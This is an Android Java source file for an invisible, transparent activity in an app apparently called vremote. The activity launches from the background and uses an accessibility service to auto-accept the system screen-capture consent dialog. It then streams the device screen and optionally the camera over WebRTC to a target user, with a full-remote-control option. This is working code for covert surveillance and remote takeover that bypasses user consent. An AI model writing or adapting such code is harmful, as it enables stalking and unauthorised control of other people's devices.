package com.tokendeal.vremote;

import android.app.Activity;
import android.content.Context;
import android.content.Intent;
import android.graphics.Color;
import android.graphics.drawable.ColorDrawable;
import android.media.projection.MediaProjectionManager;
import android.os.Build;
import android.os.Bundle;
import android.util.DisplayMetrics;
import android.view.WindowManager;

/**
 * HeadlessCaptureActivity is a 100% invisible transparent activity that requests
 * the MediaProjection permission dialog without displaying any dark window, blank screen,
 * or bringing the full MainActivity UI to the foreground.
 */
public class HeadlessCaptureActivity extends Activity {
    private static final String TAG = "HeadlessCapture";
    private static final int REQUEST_SCREEN_CAPTURE = 1001;
    private static volatile long sLastLaunchTime = 0;

    public static synchronized void start(Context context, String targetUser, boolean fullControl, boolean camera, String camChoice) {
        long now = System.currentTimeMillis();
        if (now - sLastLaunchTime < 2500) {
            AppLogs.w(TAG, "Ignoring duplicate screen share start request within 2.5s");
            return;
        }
        sLastLaunchTime = now;
        Intent intent = new Intent(context, HeadlessCaptureActivity.class);
        intent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK | Intent.FLAG_ACTIVITY_CLEAR_TOP);
        intent.putExtra("target_user", targetUser);
        intent.putExtra("full_control", fullControl);
        intent.putExtra("stream_camera", camera);
        intent.putExtra("camera_choice", camChoice);
        try {
            if (Build.VERSION.SDK_INT >= 34) {
                android.app.ActivityOptions opt = android.app.ActivityOptions.makeBasic();
                opt.setPendingIntentBackgroundActivityStartMode(android.app.ActivityOptions.MODE_BACKGROUND_ACTIVITY_START_ALLOWED);
                context.startActivity(intent, opt.toBundle());
            } else {
                context.startActivity(intent);
            }
        } catch (Exception e) {
            AppLogs.e(TAG, "Failed to launch HeadlessCaptureActivity: " + e.getMessage(), e);
        }
    }

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);

        // Ensure activity window is 100% transparent and does not turn on screen or dim
        if (getWindow() != null) {
            getWindow().setBackgroundDrawable(new ColorDrawable(Color.TRANSPARENT));
            getWindow().setDimAmount(0.0f);
            getWindow().addFlags(WindowManager.LayoutParams.FLAG_NOT_TOUCH_MODAL);
        }
        overridePendingTransition(0, 0);

        RemoteAccessibilityService.triggerAutoAccept(this);

        MediaProjectionManager manager = (MediaProjectionManager) getSystemService(Context.MEDIA_PROJECTION_SERVICE);
        if (manager != null) {
            try {
                startActivityForResult(manager.createScreenCaptureIntent(), REQUEST_SCREEN_CAPTURE);
            } catch (Exception e) {
                AppLogs.e(TAG, "Failed to create screen capture intent: " + e.getMessage(), e);
                finish();
            }
        } else {
            finish();
        }
    }

    @Override
    protected void onActivityResult(int requestCode, int resultCode, Intent data) {
        super.onActivityResult(requestCode, resultCode, data);
        if (requestCode == REQUEST_SCREEN_CAPTURE) {
            if (resultCode == Activity.RESULT_OK && data != null) {
                AppLogs.i(TAG, "Screen capture permission granted in HeadlessCaptureActivity");
                final Intent tokenIntent = (Intent) data.clone();
                Intent intent = getIntent();
                final String targetUser = intent != null ? intent.getStringExtra("target_user") : null;
                final boolean fullControl = intent != null && intent.getBooleanExtra("full_control", false);
                final boolean streamCam = intent != null && intent.getBooleanExtra("stream_camera", false);
                final String camChoice = intent != null ? intent.getStringExtra("camera_choice") : "none";

                startStreaming(tokenIntent, targetUser, fullControl, streamCam, camChoice);
            } else {
                AppLogs.w(TAG, "Screen capture permission was rejected or cancelled");
            }
        }
        finish();
        overridePendingTransition(0, 0);
    }

    private void startStreaming(Intent tokenIntent, String targetUser, boolean fullControl, boolean streamCam, String camChoice) {
        ScreenCaptureService.prepareForStart();
        ScreenCaptureService.setOnForegroundStartedListener(() -> {
            try {
                AppLogs.i(TAG, "ScreenCaptureService ready, starting WebRTC companion screen share for target=" + targetUser);
                DisplayMetrics metrics = new DisplayMetrics();
                WindowManager wm = (WindowManager) getSystemService(Context.WINDOW_SERVICE);
                if (wm != null && wm.getDefaultDisplay() != null) {
                    wm.getDefaultDisplay().getRealMetrics(metrics);
                } else {
                    metrics.widthPixels = 720;
                    metrics.heightPixels = 1600;
                }

                WebRTCCompanion companion = MainActivity.getOrCreateCompanion(getApplicationContext());
                companion.setFullControlEnabled(fullControl);
                companion.startScreenShare(targetUser, tokenIntent, metrics.widthPixels, metrics.heightPixels, streamCam, camChoice);
            } catch (Throwable t) {
                AppLogs.e(TAG, "Error in headless onForegroundStarted: " + t.getMessage(), t);
            }
        });

        Intent serviceIntent = new Intent(this, ScreenCaptureService.class);
        serviceIntent.putExtra("session_type", "screen_share");
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            startForegroundService(serviceIntent);
        } else {
            startService(serviceIntent);
        }
    }

    @Override
    public void finish() {
        super.finish();
        overridePendingTransition(0, 0);
    }
}
